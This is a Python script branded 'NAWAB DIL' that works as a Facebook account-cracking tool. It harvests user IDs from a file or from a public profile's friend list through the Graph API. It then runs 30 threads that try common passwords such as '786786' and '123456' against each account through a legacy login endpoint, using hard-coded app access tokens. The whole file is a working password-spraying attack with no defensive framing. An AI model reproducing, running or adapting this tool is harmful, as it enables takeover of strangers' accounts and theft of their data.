#!/usr/bin/python3
# coding=utf-8

import os, sys, time, datetime, random, hashlib, re, threading, json, requests
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError

# Maintenance of original system variables
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []

# Headers to mimic mobile browser behavior
headers = {
    'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16',
    'Accept-Language': 'en-US,en;q=0.5'
}

def keluar():
    print("\033[1;96m[!] \x1b[1;91mExit")
    sys.exit()

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

#### LOGO ####
logo = """
\033[1;91m 
\033[1;92m  ╭━╮╱╭╮╱╱╱╱╱╱╱╱╱╱╭╮╱╱╭━━━╮╭╮
\033[1;92m  ┃┃╰╮┃┃╱╱╱╱╱╱╱╱╱╱┃┃╱╱╰╮╭╮┃┃┃
\033[1;92m  ┃╭╮╰╯┣━━┳╮╭╮╭┳━━┫╰━╮╱┃┃┃┣┫┃
\033[1;92m  ┃┃╰╮┃┃╭╮┃╰╯╰╯┃╭╮┃╭╮┃╱┃┃┃┣┫┃
\033[1;92m  ┃┃╱┃┃┃╭╮┣╮╭╮╭┫╭╮┃╰╯┃╭╯╰╯┃┃╰╮
\033[1;92m  ╰╯╱╰━┻╯╰╯╰╯╰╯╰╯╰┻━━╯╰━━━┻┻━╯
\033[1;91m 
\033[1;92m  °°°°°°°°°°°°°NAWAB DIL°°°°°°°°°°°°°°°°
\033[1;93m**************************************
"""

def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print(f"\r\x1b[1;93mPlease Wait \x1b[1;93m{o}", end="")
        sys.stdout.flush()
        time.sleep(1)
    print()

def login():
    os.system("clear")
    try:
        # Check for existing login token
        with open('login.txt', 'r') as toket_file:
            toket = toket_file.read()
            menu(toket)
    except (FileNotFoundError, IOError):
        os.system('clear')
        print(logo)
        print(42 * "\033[1;96m=")
        print('\033[1;96m[⚡] \x1b[1;93mLogin your new id \x1b[1;93m[⚡]')
        email = input('\033[1;96m[+] \x1b[0;34mEnter ID/Email \x1b[1;93m: \x1b[1;93m')
        pwd = input('\033[1;93m[+] \x1b[0;34mEnter Password \x1b[1;93m: \x1b[1;93m')
        tik()
        
        try:
            # Using the Facebook B-API for authentication simulation
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "format": "JSON",
                "sdk_version": "2",
                "email": email,
                "password": pwd,
                "locale": "en_US",
                "sdk": "ios"
            }
            r = requests.get("https://b-api.facebook.com/method/auth.login", params=data, headers=headers)
            z = r.json()
            
            if 'access_token' in z:
                with open("login.txt", 'w') as f:
                    f.write(z['access_token'])
                print('\n\033[1;96m[✓] \x1b[1;92mLogin Successful')
                menu(z['access_token'])
            elif 'www.facebook.com' in str(z.get('error_msg')):
                print("\n\033[1;96m[!] \x1b[1;91mAccount in Checkpoint")
                keluar()
            else:
                print("\n\033[1;96m[!] \x1b[1;91mInvalid Email/Password")
                time.sleep(1)
                login()
        except ConnectionError:
            print("\n\033[1;96m[!] \x1b[1;91mNo Internet Connection")
            keluar()

def menu(toket):
    os.system('clear')
    try:
        r = requests.get(f'https://graph.facebook.com/me?access_token={toket}')
        a = r.json()
        nama = a.get('name', 'User')
        user_id = a.get('id', 'Unknown')
    except Exception:
        print("\033[1;91mToken Invalid or Session Expired")
        os.system('rm -rf login.txt')
        login()

    os.system("clear")
    print(logo)
    print(f"   \033[1;36;40m      ╔═════════════════════════════════╗")
    print(f"   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: {nama}")                               
    print(f"   \033[1;36;40m      ║\033[1;33;40m[*] ID  \033[1;34;40m: {user_id}")
    print(f"   \033[1;36;40m      ╚═════════════════════════════════╝")
    print("\033[1;32;40m[1] \033[1;33;41mCrack From File")
    print("\033[1;32;40m[2] \033[1;33;42mCrack Public ID")
    print("\033[1;32;40m[0] \033[1;33;43mLog out")
    
    pilih = input("\n\033[1;31;40m>>> \033[1;35;40m")
    if pilih == "1":
        crack_file(toket)
    elif pilih == "2":
        crack_public(toket)
    elif pilih == "0":
        os.system('rm -rf login.txt')
        keluar()
    else:
        menu(toket)

def crack_file(toket):
    os.system('clear')
    print(logo)
    path = input('\x1b[1;91m[+] \x1b[1;93mEnter File Path: \x1b[1;97m')
    try:
        with open(path, 'r') as f:
            for line in f:
                id.append(line.strip())
    except FileNotFoundError:
        print("\x1b[1;91mFile Not Found")
        time.sleep(2)
        menu(toket)
        
    process_ids(toket)

def crack_public(toket):
    os.system('clear')
    print(logo)
    idt = input("\033[1;96m[*] Enter Public ID : ")
    try:
        r = requests.get(f"https://graph.facebook.com/{idt}/friends?access_token={toket}").json()
        for i in r['data']:
            id.append(i['id'])
    except Exception:
        print("\x1b[1;91mError fetching friends list.")
        time.sleep(2)
        menu(toket)
        
    process_ids(toket)

def process_ids(toket):
    print(f"\033[1;96m[+] Total IDs : \033[1;97m{len(id)}")
    print('\x1b[1;96m[!] \x1b[1;93mCracking Started... CTRL+Z to Stop')
    print(42*"\033[1;96m=")
    
    def main(arg):
        user = arg
        # Passwords based on original logic patterns
        passlist = ['786786', 'pakistan', '123456', '12345', '786']
        for pw in passlist:
            try:
                data = requests.get(f"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%7C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={user}&password={pw}&sdk=ios").json()
                if 'access_token' in data:
                    print(f'\x1b[1;92m[OK] {user} | {pw}')
                    oks.append(user)
                    break
                elif 'checkpoint' in str(data.get('error_msg', '')):
                    print(f'\x1b[1;36;40m[CP] {user} | {pw}')
                    cekpoint.append(user)
                    break
            except:
                pass

    p = ThreadPool(30)
    p.map(main, id)
    print(f"\n\033[1;32;40m[+] Total OK/CP : {len(oks)}/{len(cekpoint)}")
    input("\n\033[1;97mPress Enter to Return")
    menu(toket)

if __name__ == '__main__':
    os.system("clear")
    print(logo)
    # Original Nawab Dil Gate
    correct_user = "Nawab"
    correct_pass = "Dil"
    
    u = input("\033[1;97m📋 \x1b[1;95mENTER USER\x1b[1;97m»» ")
    p = input("\033[1;97m🗝 \x1b[1;95mENTER PASSWORD\x1b[1;97m»» ")
    
    if u == correct_user and p == correct_pass:
        login()
    else:
        print("\x1b[1;91mWrong Username or Password")
